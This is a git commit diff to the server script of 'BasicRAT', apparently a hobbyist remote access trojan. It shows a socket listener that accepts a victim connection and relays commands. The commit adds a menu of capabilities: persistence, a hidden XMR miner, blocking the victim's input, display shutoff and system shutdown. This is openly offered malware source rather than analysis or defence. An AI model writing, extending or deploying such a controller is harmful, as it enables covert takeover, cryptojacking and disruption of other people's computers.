486b723b81f6430d6e4b4f464a7552c526a2ed60
sir <94076644+sirmilann@users.noreply.github.com>
2023-01-29 15:10:04 +0100

    Add files via upload

--- BasicRAT/server.py
+++ BasicRAT/server.py
@@ -10,20 +10,33 @@ PORT = 8888
 DATA = 16384
 
 print(Fore.RED+"""
-   ▄▄▄▄▄   ▄███▄   █▄▄▄▄    ▄   ▄███▄   █▄▄▄▄ 
-  █     ▀▄ █▀   ▀  █  ▄▀     █  █▀   ▀  █  ▄▀ 
-▄  ▀▀▀▀▄   ██▄▄    █▀▀▌ █     █ ██▄▄    █▀▀▌  
- ▀▄▄▄▄▀    █▄   ▄▀ █  █  █    █ █▄   ▄▀ █  █  
-           ▀███▀     █    █  █  ▀███▀     █   
-                    ▀      █▐            ▀    
-                           ▐                  
+   ▄▄▄▄▄   ▄███▄   █▄▄▄▄    ▄   ▄███▄   █▄▄▄▄
+  █     ▀▄ █▀   ▀  █  ▄▀     █  █▀   ▀  █  ▄▀
+▄  ▀▀▀▀▄   ██▄▄    █▀▀▌ █     █ ██▄▄    █▀▀▌
+ ▀▄▄▄▄▀    █▄   ▄▀ █  █  █    █ █▄   ▄▀ █  █
+           ▀███▀     █    █  █  ▀███▀     █
+                    ▀      █▐            ▀
+                           ▐
 """)
 
 servermain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 servermain.bind((IP, PORT))
 servermain.listen(1)
 client, clientaddr = servermain.accept()
-print(f"Got A Connection from {clientaddr}.")
+print(f"[*] Got A Connection from {clientaddr}.")
+print("""
+* = Requires Admin
+• Volup. Turns The Clients Volume Up By 2 Percent
+• Voldown. Decreases The Clients Volume By 2 Percent.
+• Persist. Makes The Client File Persist On The System.
+• Mine. Starts A Powerfull XMR Miner On The Clients System.
+• Cd. Changes The CWD.
+• Dir. Shows All The Files In A Location
+• Shutdown. Shuts The Clients System Off
+• Blockinput. Blocks The Clients Input *
+• Unblockinput. Unblocks The Clients Input *
+• Displayoff. Turns The Client Display Off *
+""")
 
 while True:
     try:
@@ -39,4 +52,4 @@ while True:
             client_response = str(client.recv(DATA),"utf-8")
             print(client_response, end="")
     except Exception as e:
-        print("Error running command: ",e)
+        print("[!] Error running command: ",e)
